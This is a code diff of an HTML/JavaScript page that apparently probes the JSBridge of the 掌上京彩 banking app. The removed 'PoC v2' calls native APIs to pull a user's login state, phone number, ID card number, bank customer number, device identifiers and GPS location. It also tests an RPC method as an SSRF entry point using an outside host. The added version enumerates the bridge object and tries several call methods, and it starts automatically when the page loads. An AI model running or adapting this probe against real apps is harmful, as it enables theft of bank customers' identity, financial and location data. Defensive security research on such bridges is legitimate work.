@@ -3,227 +3,270 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>掌上京彩 JSBridge 探测 PoC v2</title>
+<title>TMF Bridge 方法探测</title>
 <style>
-* { box-sizing: border-box; margin: 0; padding: 0; }
-body { background: #0d1117; color: #c9d1d9; font-family: monospace; font-size: 12px; }
-.header { background: #161b22; border-bottom: 2px solid #ff6b6b; padding: 10px 14px; }
-.header h1 { color: #ff6b6b; font-size: 14px; }
-.section { margin: 8px; background: #161b22; border-radius: 6px; overflow: hidden; }
-.section-title { background: #21262d; padding: 6px 10px; color: #e3b341; font-size: 11px; font-weight: bold; }
-.row { display: flex; align-items: flex-start; padding: 6px 10px; border-bottom: 1px solid #21262d; gap: 8px; }
-.row:last-child { border-bottom: none; }
-.api-name { color: #58a6ff; min-width: 180px; font-size: 11px; flex-shrink: 0; }
-.tag { display: inline-block; padding: 1px 5px; border-radius: 3px; font-size: 10px; min-width: 60px; text-align: center; flex-shrink: 0; }
-.tag-ok    { background: #1a3a2a; color: #3fb950; }
-.tag-enc   { background: #3a2a10; color: #e3b341; }
-.tag-fail  { background: #3a1a1a; color: #f85149; }
-.tag-wait  { background: #21262d; color: #8b949e; }
-.tag-skip  { background: #1a1a3a; color: #8b949e; }
-.data { color: #aaa; font-size: 10px; word-break: break-all; flex: 1; }
-.summary-box { margin: 8px; background: #161b22; border-radius: 6px; padding: 10px 14px; }
-.env-row { display: flex; gap: 16px; flex-wrap: wrap; margin-bottom: 8px; }
-.env-item { display: flex; flex-direction: column; }
-.env-label { color: #8b949e; font-size: 10px; }
-.env-value { color: #c9d1d9; font-size: 12px; }
-#progress { padding: 6px 14px; color: #58a6ff; font-size: 11px; }
+body { background: #0d1117; color: #c9d1d9; font-family: monospace; font-size: 12px; padding: 12px; }
+h2 { color: #ff6b6b; margin-bottom: 8px; }
+pre { background: #161b22; padding: 10px; border-radius: 6px; overflow: auto; font-size: 11px; white-space: pre-wrap; word-break: break-all; }
+.ok { color: #3fb950; }
+.warn { color: #e3b341; }
+.err { color: #f85149; }
+button { background: #238636; color: white; border: none; padding: 6px 14px; border-radius: 4px; cursor: pointer; margin: 4px 2px; font-size: 11px; }
+button:hover { background: #2ea043; }
+input { background: #161b22; color: #c9d1d9; border: 1px solid #30363d; padding: 4px 8px; border-radius: 4px; width: 100%; margin-bottom: 4px; font-size: 11px; }
+.section { margin-bottom: 16px; }
 </style>
 </head>
 <body>
 
-<div class="header">
-  <h1>🔍 掌上京彩 三方容器 JSBridge 探测 v2</h1>
-</div>
+<h2>🔬 TMF Bridge 方法探测工具</h2>
 
-<!-- 环境检测 -->
-<div class="summary-box">
-  <div class="env-row" id="envRow">
-    <div class="env-item"><span class="env-label">TMFJSBridge</span><span class="env-value" id="e-bridge">检测中...</span></div>
-    <div class="env-item"><span class="env-label">当前URL</span><span class="env-value" id="e-url">-</span></div>
-    <div class="env-item"><span class="env-label">UserAgent</span><span class="env-value" id="e-ua">-</span></div>
-    <div class="env-item"><span class="env-label">容器类型</span><span class="env-value" id="e-type">-</span></div>
-  </div>
-</div>
-
-<div id="progress">⏳ 等待 TMFJSBridge...</div>
-
-<!-- 无需白名单的接口（直接继承 TMFBaseJsApi） -->
 <div class="section">
-  <div class="section-title">✅ 无需白名单接口（三方容器直接可用）</div>
-  <div class="row"><span class="api-name">showAnimationLoading</span><span class="tag tag-wait" id="s-showAnimationLoading">等待</span><span class="data" id="d-showAnimationLoading">显示 loading 动画</span></div>
-  <div class="row"><span class="api-name">hideAnimationLoading</span><span class="tag tag-wait" id="s-hideAnimationLoading">等待</span><span class="data" id="d-hideAnimationLoading">隐藏 loading 动画</span></div>
-  <div class="row"><span class="api-name">openWechatMiniApp</span><span class="tag tag-wait" id="s-openWechatMiniApp">等待</span><span class="data" id="d-openWechatMiniApp">打开微信小程序</span></div>
-  <div class="row"><span class="api-name">openThirdWechatMiniApp</span><span class="tag tag-wait" id="s-openThirdWechatMiniApp">等待</span><span class="data" id="d-openThirdWechatMiniApp">打开三方微信小程序</span></div>
+<h3 class="warn">Step 1: Bridge 对象属性枚举</h3>
+<button onclick="inspectBridge()">枚举所有方法和属性</button>
+<pre id="inspect-out">点击上方按钮开始...</pre>
 </div>
 
-<!-- 需要白名单的敏感接口 -->
 <div class="section">
-  <div class="section-title">🔒 需白名单接口（域名未注册则超时/拒绝）</div>
-  <div class="row"><span class="api-name">thirdGetIsLogin</span><span class="tag tag-wait" id="s-thirdGetIsLogin">等待</span><span class="data" id="d-thirdGetIsLogin">登录状态（0/1）</span></div>
-  <div class="row"><span class="api-name">thirdGetIsAuthentication</span><span class="tag tag-wait" id="s-thirdGetIsAuthentication">等待</span><span class="data" id="d-thirdGetIsAuthentication">实名认证状态</span></div>
-  <div class="row"><span class="api-name">thirdGetUserPhotoNumber</span><span class="tag tag-wait" id="s-thirdGetUserPhotoNumber">等待</span><span class="data" id="d-thirdGetUserPhotoNumber">手机号（RSA密文）</span></div>
-  <div class="row"><span class="api-name">thirdGetUserPhotoNumberSuffix</span><span class="tag tag-wait" id="s-thirdGetUserPhotoNumberSuffix">等待</span><span class="data" id="d-thirdGetUserPhotoNumberSuffix">手机号后4位</span></div>
-  <div class="row"><span class="api-name">thirdGetUserIdCardNum</span><span class="tag tag-wait" id="s-thirdGetUserIdCardNum">等待</span><span class="data" id="d-thirdGetUserIdCardNum">身份证号（RSA密文）</span></div>
-  <div class="row"><span class="api-name">thirdGetUserIdCardMd5Num</span><span class="tag tag-wait" id="s-thirdGetUserIdCardMd5Num">等待</span><span class="data" id="d-thirdGetUserIdCardMd5Num">身份证 MD5</span></div>
-  <div class="row"><span class="api-name">thirdGetUserCif</span><span class="tag tag-wait" id="s-thirdGetUserCif">等待</span><span class="data" id="d-thirdGetUserCif">银行客户号 CIF</span></div>
-  <div class="row"><span class="api-name">thirdGetMobileInfo</span><span class="tag tag-wait" id="s-thirdGetMobileInfo">等待</span><span class="data" id="d-thirdGetMobileInfo">MAC/IMEI/UDID/IP</span></div>
-  <div class="row"><span class="api-name">thirdGetLocation</span><span class="tag tag-wait" id="s-thirdGetLocation">等待</span><span class="data" id="d-thirdGetLocation">GPS 精确坐标</span></div>
-  <div class="row"><span class="api-name">thirdGetUserProvinceAndCity</span><span class="tag tag-wait" id="s-thirdGetUserProvinceAndCity">等待</span><span class="data" id="d-thirdGetUserProvinceAndCity">省市</span></div>
-  <div class="row"><span class="api-name">thirdGetUserLongitudeAndLatitude</span><span class="tag tag-wait" id="s-thirdGetUserLongitudeAndLatitude">等待</span><span class="data" id="d-thirdGetUserLongitudeAndLatitude">经纬度</span></div>
-  <div class="row"><span class="api-name">thirdGetAppVersion</span><span class="tag tag-wait" id="s-thirdGetAppVersion">等待</span><span class="data" id="d-thirdGetAppVersion">App版本号</span></div>
-  <div class="row"><span class="api-name">thirdGetRandomNumber</span><span class="tag tag-wait" id="s-thirdGetRandomNumber">等待</span><span class="data" id="d-thirdGetRandomNumber">随机数（验签用）</span></div>
-  <div class="row"><span class="api-name">thirdGetETCCardListJsapi</span><span class="tag tag-wait" id="s-thirdGetETCCardListJsapi">等待</span><span class="data" id="d-thirdGetETCCardListJsapi">ETC卡列表</span></div>
-  <div class="row"><span class="api-name">thirdRpcPost</span><span class="tag tag-wait" id="s-thirdRpcPost">等待</span><span class="data" id="d-thirdRpcPost">RPC请求（SSRF 入口）</span></div>
+<h3 class="warn">Step 2: 常用调用方式测试</h3>
+<button onclick="testCallMethods()">自动测试所有可能的调用方式</button>
+<pre id="call-out">等待...</pre>
+</div>
+
+<div class="section">
+<h3 class="warn">Step 3: 手动调用（找到正确方式后）</h3>
+<input id="api-name" value="thirdGetIsLogin" placeholder="API名称">
+<input id="api-params" value="{}" placeholder="参数 JSON">
+<button onclick="manualCall()">调用</button>
+<pre id="manual-out">等待...</pre>
+</div>
+
+<div class="section">
+<h3 class="warn">Step 4: 全局对象枚举（找所有 Bridge 相关对象）</h3>
+<button onclick="enumGlobal()">枚举 window 上的 Bridge 对象</button>
+<pre id="global-out">等待...</pre>
 </div>
 
 <script>
-// ─── 工具函数 ─────────────────────────────────────────
-function $(id){ return document.getElementById(id); }
-
-function setStatus(name, type, text) {
-  var el = $('s-' + name);
-  if (!el) return;
-  el.className = 'tag tag-' + type;
-  el.textContent = {
-    'ok': '✅ 响应',
-    'enc': '🔒 密文',
-    'fail': '❌ 失败',
-    'wait': '⏳ 等待',
-    'skip': '⏭ 跳过'
-  }[type] || type;
+function log(id, text, cls) {
+  var el = document.getElementById(id);
+  el.innerHTML += '<span class="' + (cls||'') + '">' + escHtml(text) + '\n</span>';
 }
+function escHtml(s){ return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }
 
-function setData(name, text) {
-  var el = $('d-' + name);
-  if (el) el.textContent = text;
-}
-
-function isBase64Cipher(str) {
-  // RSA 密文通常是很长的 base64 字符串
-  return str && /[A-Za-z0-9+\/]{80,}={0,2}/.test(str);
-}
-
-var TIMEOUT = 6000;
-function callBridge(apiName, params, callback) {
-  if (!window.TMFJSBridge) { callback('no_bridge', null); return; }
-  var cbId = '_cb_' + apiName + '_' + Date.now();
-  var done = false;
-  window[cbId] = function(result) {
-    if (done) return;
-    done = true;
-    delete window[cbId];
-    callback(null, result);
-  };
+// Step 1: 枚举 TMFJSBridge 的所有属性和方法
+function inspectBridge() {
+  var el = document.getElementById('inspect-out');
+  el.innerHTML = '';
+  
+  if (!window.TMFJSBridge) {
+    log('inspect-out', '❌ window.TMFJSBridge 不存在！', 'err');
+    return;
+  }
+  
+  log('inspect-out', '✅ window.TMFJSBridge 存在', 'ok');
+  log('inspect-out', 'typeof: ' + typeof window.TMFJSBridge, 'ok');
+  log('inspect-out', '\n--- 所有属性 ---', 'warn');
+  
+  // 枚举所有属性（包括原型链）
+  var props = [];
+  for (var key in window.TMFJSBridge) {
+    props.push(key + ' [' + typeof window.TMFJSBridge[key] + ']');
+  }
+  
+  // 也尝试 Object.getOwnPropertyNames
   try {
-    window.TMFJSBridge.call(apiName, JSON.stringify(params || {}), cbId);
-  } catch(e) {
-    done = true;
-    callback('err:' + e.message, null);
-    return;
-  }
-  setTimeout(function() {
-    if (!done && window[cbId]) {
-      done = true;
-      delete window[cbId];
-      callback('timeout', null);
-    }
-  }, TIMEOUT);
-}
-
-// ─── 检测环境 ────────────────────────────────────────
-function detectEnv() {
-  $('e-url').textContent = location.href.substring(0, 60) + '...';
-  $('e-ua').textContent = navigator.userAgent.substring(0, 60) + '...';
-  if (window.TMFJSBridge) {
-    $('e-bridge').textContent = '✅ 已注入';
-    $('e-bridge').style.color = '#3fb950';
-    $('e-type').textContent = '受限三方容器';
-  } else {
-    $('e-bridge').textContent = '❌ 未注入（请通过 App DeepLink 打开）';
-    $('e-bridge').style.color = '#f85149';
-    $('e-type').textContent = '普通浏览器';
-  }
-}
-
-// ─── 分组测试 ─────────────────────────────────────────
-var NON_THIRD = ['showAnimationLoading', 'hideAnimationLoading', 'openWechatMiniApp', 'openThirdWechatMiniApp'];
-var THIRD_APIS = [
-  'thirdGetIsLogin', 'thirdGetIsAuthentication',
-  'thirdGetUserPhotoNumber', 'thirdGetUserPhotoNumberSuffix',
-  'thirdGetUserIdCardNum', 'thirdGetUserIdCardMd5Num',
-  'thirdGetUserCif', 'thirdGetMobileInfo',
-  'thirdGetLocation', 'thirdGetUserProvinceAndCity',
-  'thirdGetUserLongitudeAndLatitude',
-  'thirdGetAppVersion', 'thirdGetRandomNumber',
-  'thirdGetETCCardListJsapi',
-  'thirdRpcPost'
-];
-
-function runApis(list, index) {
-  if (index >= list.length) {
-    $('progress').textContent = '✅ 探测完成！';
-    return;
-  }
-  var name = list[index];
-  $('progress').textContent = '⏳ 探测中 [' + (index+1) + '/' + list.length + '] ' + name;
-  setStatus(name, 'wait', '请求中');
-  
-  // thirdRpcPost 特殊参数（SSRF 测试）
-  var params = {};
-  if (name === 'thirdRpcPost') {
-    params = { url: 'https://lzzaimyn.github.io/', method: 'GET' };
-  }
-  
-  callBridge(name, params, function(err, result) {
-    if (err === 'no_bridge') {
-      setStatus(name, 'skip', '无Bridge');
-      setTimeout(function(){ runApis(list, index+1); }, 50);
-    } else if (err === 'timeout') {
-      setStatus(name, 'fail', '❌超时');
-      setData(name, '超时(6s) - 域名未在白名单 or 未登录');
-      setTimeout(function(){ runApis(list, index+1); }, 100);
-    } else if (err) {
-      setStatus(name, 'fail', '错误');
-      setData(name, err);
-      setTimeout(function(){ runApis(list, index+1); }, 100);
-    } else {
-      var s = typeof result === 'string' ? result : JSON.stringify(result);
-      if (isBase64Cipher(s)) {
-        setStatus(name, 'enc', '🔒密文');
-        setData(name, s.substring(0, 80) + '...[RSA密文]');
-      } else {
-        setStatus(name, 'ok', '✅响应');
-        setData(name, s.substring(0, 200));
+    var ownProps = Object.getOwnPropertyNames(window.TMFJSBridge);
+    ownProps.forEach(function(k) {
+      var type = typeof window.TMFJSBridge[k];
+      if (props.indexOf(k + ' [' + type + ']') === -1) {
+        props.push(k + ' [' + type + '] (own)');
       }
-      setTimeout(function(){ runApis(list, index+1); }, 300);
+    });
+  } catch(e) {}
+  
+  if (props.length === 0) {
+    log('inspect-out', '(无可枚举属性，尝试原型链...)', 'warn');
+    // 尝试常见方法名
+    var tryMethods = ['call', 'callHandler', 'invoke', 'send', 'postMessage', 
+                      'nativeCall', 'callNative', 'dispatch', 'trigger',
+                      'register', 'registerHandler', 'on', 'emit',
+                      'handleMessageFromNative', '_handleMessageFromNative'];
+    tryMethods.forEach(function(m) {
+      var type = typeof window.TMFJSBridge[m];
+      if (type !== 'undefined') {
+        log('inspect-out', '  ' + m + ': ' + type, 'ok');
+      }
+    });
+  } else {
+    props.forEach(function(p) { log('inspect-out', '  ' + p, 'ok'); });
+  }
+  
+  // 打印 JSON 序列化结果（看看有没有隐藏属性）
+  log('inspect-out', '\n--- JSON.stringify ---', 'warn');
+  try {
+    log('inspect-out', JSON.stringify(window.TMFJSBridge), 'ok');
+  } catch(e) {
+    log('inspect-out', '无法序列化: ' + e.message, 'err');
+  }
+  
+  // 打印 toString
+  log('inspect-out', '\n--- toString ---', 'warn');
+  try {
+    log('inspect-out', String(window.TMFJSBridge), 'ok');
+  } catch(e) {
+    log('inspect-out', e.message, 'err');
+  }
+  
+  // 看 constructor
+  log('inspect-out', '\n--- constructor ---', 'warn');
+  try {
+    log('inspect-out', String(window.TMFJSBridge.constructor), 'ok');
+  } catch(e) {}
+}
+
+// Step 2: 自动测试所有可能的调用方式
+function testCallMethods() {
+  var el = document.getElementById('call-out');
+  el.innerHTML = '';
+  
+  if (!window.TMFJSBridge) {
+    log('call-out', '❌ Bridge 不存在', 'err');
+    return;
+  }
+  
+  var testCb = function(result) {
+    log('call-out', '  [回调收到]: ' + JSON.stringify(result), 'ok');
+  };
+  
+  var methods = [
+    // TMF 官方文档可能的格式
+    function() { window.TMFJSBridge.callHandler('thirdGetIsLogin', {}, testCb); return 'callHandler(name, data, cb)'; },
+    function() { window.TMFJSBridge.call('thirdGetIsLogin', '{}', '_cb'); return 'call(name, str, cbName)'; },
+    function() { window.TMFJSBridge.invoke('thirdGetIsLogin', {}, testCb); return 'invoke(name, data, cb)'; },
+    function() { window.TMFJSBridge.send('thirdGetIsLogin', {}, testCb); return 'send(name, data, cb)'; },
+    function() { window.TMFJSBridge.nativeCall('thirdGetIsLogin', '{}', '_cb'); return 'nativeCall(name, str, cbName)'; },
+    // WebViewJavascriptBridge 风格
+    function() { window.TMFJSBridge.handleMessageFromNative(JSON.stringify({handlerName:'thirdGetIsLogin',data:{}})); return 'handleMessageFromNative(json)'; },
+    // 直接调用
+    function() { window.TMFJSBridge('thirdGetIsLogin', {}, testCb); return 'TMFJSBridge(name, data, cb)'; },
+  ];
+  
+  window._cb = testCb; // 全局回调备用
+  
+  methods.forEach(function(fn, i) {
+    var desc = '';
+    try {
+      desc = fn();
+      log('call-out', '[' + i + '] ' + desc + ' → ✅ 无异常', 'ok');
+    } catch(e) {
+      log('call-out', '[' + i + '] ' + (desc||'?') + ' → ❌ ' + e.message, 'err');
+    }
+  });
+  
+  log('call-out', '\n等待 3 秒看是否有回调...', 'warn');
+  setTimeout(function() {
+    log('call-out', '\n3秒后未收到额外回调（如有请看上方）', 'warn');
+  }, 3000);
+}
+
+// Step 3: 手动调用
+function manualCall() {
+  var el = document.getElementById('manual-out');
+  el.innerHTML = '';
+  var apiName = document.getElementById('api-name').value.trim();
+  var paramsStr = document.getElementById('api-params').value.trim();
+  var params = {};
+  try { params = JSON.parse(paramsStr); } catch(e) {}
+  
+  log('manual-out', '调用: ' + apiName + ' params: ' + paramsStr, 'warn');
+  
+  var cbName = '__manualCb_' + Date.now();
+  window[cbName] = function(result) {
+    log('manual-out', '✅ 回调: ' + JSON.stringify(result), 'ok');
+    delete window[cbName];
+  };
+  
+  // 尝试 callHandler 方式
+  try {
+    window.TMFJSBridge.callHandler(apiName, params, window[cbName]);
+    log('manual-out', '  → callHandler 已发出', 'ok');
+  } catch(e) {
+    log('manual-out', '  → callHandler 失败: ' + e.message, 'err');
+  }
+  
+  setTimeout(function(){
+    if(window[cbName]) {
+      log('manual-out', '  → 6s 超时，无响应', 'err');
+      delete window[cbName];
+    }
+  }, 6000);
+}
+
+// Step 4: 枚举全局 window 上的 Bridge 相关对象
+function enumGlobal() {
+  var el = document.getElementById('global-out');
+  el.innerHTML = '';
+  
+  var keywords = ['bridge', 'Bridge', 'tmf', 'TMF', 'jsapi', 'JSAPI', 'native', 'Native', 
+                   'webkit', 'android', 'csii', 'bjbank'];
+  var found = [];
+  
+  try {
+    Object.keys(window).forEach(function(key) {
+      if (keywords.some(function(k){ return key.indexOf(k) >= 0; })) {
+        found.push(key + ' [' + typeof window[key] + ']');
+      }
+    });
+  } catch(e) {
+    // Chrome 限制，用 for...in
+    for (var k in window) {
+      if (keywords.some(function(kw){ return k.indexOf(kw) >= 0; })) {
+        found.push(k + ' [' + typeof window[k] + ']');
+      }
+    }
+  }
+  
+  if (found.length > 0) {
+    log('global-out', '发现以下相关全局对象:', 'ok');
+    found.forEach(function(f) { log('global-out', '  ' + f, 'ok'); });
+  } else {
+    log('global-out', '未发现 Bridge 相关全局对象', 'err');
+  }
+  
+  // 额外检查 webkit messageHandlers
+  log('global-out', '\n--- webkit.messageHandlers ---', 'warn');
+  if (window.webkit && window.webkit.messageHandlers) {
+    log('global-out', '存在 webkit.messageHandlers', 'ok');
+  } else {
+    log('global-out', '不存在（Android 预期）', 'warn');
+  }
+  
+  // 检查 Android 注入的 Java 对象
+  log('global-out', '\n--- Android JavascriptInterface ---', 'warn');
+  ['Android', 'android', 'TMF', 'JsBridge', 'CsiiAndroid'].forEach(function(name) {
+    if (window[name]) {
+      log('global-out', '✅ window.' + name + ' 存在! typeof=' + typeof window[name], 'ok');
     }
   });
 }
 
-function start() {
-  detectEnv();
-  if (!window.TMFJSBridge) {
-    $('progress').textContent = '❌ TMFJSBridge 未注入！请通过 App DeepLink 进入';
-    NON_THIRD.concat(THIRD_APIS).forEach(function(n){ setStatus(n, 'skip', '无Bridge'); });
-    return;
+// 页面加载后自动执行环境检测
+window.addEventListener('load', function() {
+  if (window.TMFJSBridge) {
+    log('inspect-out', '✅ TMFJSBridge 已注入，请点击"枚举所有方法"按钮', 'ok');
+    // 自动执行枚举
+    setTimeout(inspectBridge, 500);
+    setTimeout(testCallMethods, 1000);
+    setTimeout(enumGlobal, 1500);
+  } else {
+    document.addEventListener('TMFJSBridgeReady', function() {
+      inspectBridge();
+      setTimeout(testCallMethods, 500);
+      setTimeout(enumGlobal, 1000);
+    }, { once: true });
   }
-  // 先测不需要白名单的，再测需要的
-  runApis(NON_THIRD, 0);
-  setTimeout(function(){ runApis(THIRD_APIS, 0); }, NON_THIRD.length * 500);
-}
-
-if (window.TMFJSBridge) {
-  start();
-} else {
-  document.addEventListener('TMFJSBridgeReady', start, { once: true });
-  setTimeout(function(){
-    detectEnv();
-    if (!window.TMFJSBridge) {
-      $('progress').textContent = '❌ 请通过 DeepLink: beijingxinyongka://?jumpUrl=' + location.href + ' 打开';
-      $('progress').style.color = '#f85149';
-    }
-  }, 2000);
-}
+});
 </script>
 </body>
 </html>
